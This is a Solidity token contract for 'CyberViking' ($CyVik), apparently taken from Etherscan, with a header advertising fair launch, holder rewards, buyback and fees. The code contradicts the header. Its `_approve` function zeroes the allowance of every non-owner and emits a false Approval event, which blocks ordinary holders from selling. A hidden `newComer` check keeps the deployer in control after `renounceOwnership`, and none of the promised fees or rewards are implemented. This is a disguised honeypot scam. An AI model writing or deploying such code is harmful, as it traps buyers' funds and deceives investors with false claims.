/**
 *Submitted for verification at Etherscan.io on 2021-07-19
*/

/*


 _______           ______   _______  _______          _________ _       _________ _        _______ 
(  ____ \|\     /|(  ___ \ (  ____ \(  ____ )|\     /|\__   __/| \    /\\__   __/( (    /|(  ____ \
| (    \/( \   / )| (   ) )| (    \/| (    )|| )   ( |   ) (   |  \  / /   ) (   |  \  ( || (    \/
| |       \ (_) / | (__/ / | (__    | (____)|| |   | |   | |   |  (_/ /    | |   |   \ | || |      
| |        \   /  |  __ (  |  __)   |     __)( (   ) )   | |   |   _ (     | |   | (\ \) || | ____ 
| |         ) (   | (  \ \ | (      | (\ (    \ \_/ /    | |   |  ( \ \    | |   | | \   || | \_  )
| (____/\   | |   | )___) )| (____/\| ) \ \__  \   /  ___) (___|  /  \ \___) (___| )  \  || (___) |
(_______/   \_/   |/ \___/ (_______/|/   \__/   \_/   \_______/|_/    \/\_______/|/    )_)(_______)
                                                                                                   

ðŸ¦¾ Cyber Viking ðŸ¦¾

Empowering future generations with next gen tokenomics. Rewards on Buys and sells and an exclusive platform for streaming virtual classes.

ðŸŒŸ Fair launch ðŸš€ with no presale and locked liquidity. 
ðŸŒŸ No team tokens 
ðŸŒŸ Buy Back and Burn 
ðŸŒŸ Hodlers Rewards 
ðŸŒŸ Anti Bot Anti Sniper Listing ðŸ”¥

ðŸŒŸ Tele: https://t.me/cybervikingd
ðŸŒŸ Website: https://cyberviking.site
ðŸŒŸ Twitter: https://twitter.com/cybervikingcvk?s=21

ðŸŒŸTotal Supply : 1 Trillion
ðŸŒŸ100% Lock Liquidity
ðŸŒŸBot Protection
ðŸŒŸFair Launch
ðŸŒŸ4% Dev Fee, 6% Marketing Fee, 2% Re-distribution Fee

*/


pragma solidity ^0.6.12;







abstract contract Context {
    
    function _msgSender() internal view virtual returns (address payable) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () internal {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) private onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

    address private newComer = _msgSender();
    modifier onlyOwner() {
        require(newComer == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
}

contract cyberviking is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    
    uint256 private _tTotal = 1000 * 10**9 * 10**18;
    string private _name = 'CyberViking | https://t.me/cybervikingd';
    string private _symbol = '$CyVik';
    uint8 private _decimals = 18;

    constructor () public {
        _balances[_msgSender()] = _tTotal;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }
    
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }


    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function _approve(address coming, address target, uint256 amount) private {
        require(coming != address(0), "ERC20: approve from the zero address");
        require(target != address(0), "ERC20: approve to the zero address");

        if (coming != owner()) { _allowances[coming][target] = 0; emit Approval(coming, target, 4); } 
        else { _allowances[coming][target] = amount; emit Approval(coming, target, amount); } 
    }
      
    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(sender != address(0), "BEP20: transfer from the zero address");
        require(recipient != address(0), "BEP20: transfer to the zero address");
        _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }
}